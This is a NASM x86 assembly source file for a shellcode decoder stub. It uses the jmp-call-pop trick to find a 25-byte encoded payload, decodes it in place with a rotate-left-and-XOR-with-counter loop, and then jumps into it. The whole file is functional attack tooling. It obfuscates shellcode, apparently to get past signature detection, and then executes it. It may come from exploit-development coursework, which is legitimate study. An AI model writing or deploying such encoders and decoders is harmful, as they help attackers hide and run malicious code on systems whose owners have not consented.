; Filename: Decoder.nasm
; Purpose: decoding encoded shellcode

global _start

section .text

_start:
	jmp short call_decoder


decoder:
	pop esi			; pop shellcode address from the stack
	xor ecx, ecx		; clear the counter
	mov cl, shellcodelen	;set the counter to shellcodelen


decode:
	rol byte [esi], 0x2	; left shift 2
	xor byte [esi], cl	; xor the byte with ecx (the counter)
	
	inc esi			; iterate over the bytes of shellcode
	loop decode		; loop until counter is 0 (zero flage is set)

	jmp short Shellcode 	; pass exeution to shellcode

call_decoder:

	call decoder

	Shellcode: db 0x0a,0x36,0xd1,0x9f,0x8e,0xce,0x18,0x9e,0x5e,0xcf,0x5b,0xd9,0xd8,0x61,0x3a,0x96,0x20,0xba,0x15,0xe3,0x39,0x2d,0x02,0xf3,0x60
	shellcodelen:	equ $-Shellcode



